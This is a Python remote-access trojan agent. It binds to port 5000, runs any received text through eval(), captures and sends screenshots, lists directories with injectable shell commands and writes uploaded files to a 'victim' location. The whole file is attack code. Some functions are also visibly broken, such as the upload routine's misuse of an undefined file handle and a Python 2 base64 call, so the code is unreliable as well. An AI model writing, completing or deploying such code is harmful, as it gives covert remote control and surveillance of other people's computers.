import socket
import os,sys
import pyautogui
import base64
import cv2
import pickle
import struct

import cv2,time

SIZE=1024
print("waiting for connection..")
host=''
port=5000
loc=''

def screenshot():                                         #screenshot
    pic = pyautogui.screenshot()
    pic.save('Screenshot.png')
    f=open("screenshot.png","rb")
    content = f.read()
    c.send(content)
    f.close()

def upload():                                            #up;oad file
    string=c.recv(409600)#base64 encryp
    a=c.recv(409600).decode()#file name
    b=c.recv(409600).decode()#victim loc
    f.open(c+a,'w')
    print(c+a)
    f.write(string.decode('base64'))
    f.close()
    
    
        
    
    
def dir():                                                 #dir
    print("\n")
    loc=c.recv(10240).decode()
    directory=loc+'\system.txt'
    os.popen('dir '+loc+' > '+directory)
    os.system('timeout 0.02')
    f= open(directory,"r")
    for line in f:
        c.send(line.encode('utf-8'))
    line='q'
    c.send(line.encode('utf-8'))
    f.close()
    os.system('del '+ loc+'\system.txt')

    
    
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host,port))

s.listen(5)#1 means the no of connection
c, addr = s.accept()
print("connection from:"+str(addr))
while True:
    data = c.recv(10240).decode()
    if not data:
        break
    print("from connected user:"+str(data))
    eval(data)
c.close()



